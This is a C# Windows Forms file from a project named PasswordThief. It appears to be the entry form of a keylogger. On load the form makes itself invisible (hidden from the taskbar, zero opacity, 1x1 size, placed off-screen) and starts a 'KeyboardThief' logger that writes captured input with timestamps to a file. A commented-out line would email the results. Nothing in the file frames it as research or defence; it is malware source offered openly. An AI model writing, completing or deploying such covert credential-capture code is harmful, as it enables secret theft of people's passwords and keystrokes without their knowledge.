using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PasswordThief
{
    public partial class Main : Form
    {
        private KeyboardThief thief = new KeyboardThief();

        public Main()
        {
            
            InitializeComponent();
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;
            this.Opacity = 0;
            this.Size = new Size(1, 1);
            this.Location = new Point(-2000, -2000);
           
        }

       
        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            
            thief.Finish();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            thief.Start();
            thief.WriteStringToFile(Environment.NewLine + Environment.NewLine);
            thief.WriteStringToFile(Convert.ToString(DateTime.Now));
            thief.WriteStringToFile(Environment.NewLine + Environment.NewLine);
            //thief.SendEmail();
        }
    }
}
